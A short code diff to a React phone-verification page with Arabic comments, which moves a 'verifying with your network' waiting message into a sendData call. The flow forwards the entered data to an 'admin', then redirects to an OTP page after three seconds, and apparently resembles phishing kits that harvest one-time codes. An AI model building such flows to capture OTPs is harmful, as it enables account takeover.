@@ -145,7 +145,6 @@ export default function PhoneVerification() {
     if (data.serviceProvider !== "0") {
       // إظهار شاشة الانتظار
       setAutoRedirecting(true);
-      waitingMessage.value = "جاري التوثيق مع شبكة الإتصال الخاصة بك";
       
       // إرسال البيانات للأدمن بدون انتظار الرد
       sendData({
@@ -157,6 +156,7 @@ export default function PhoneVerification() {
         current: "توثيق رقم الجوال",
         nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
         waitingForAdminResponse: false,
+        customWaitingMessage: "جاري التوثيق مع شبكة الإتصال الخاصة بك",
       });
       
       // التحويل التلقائي بعد 3 ثواني
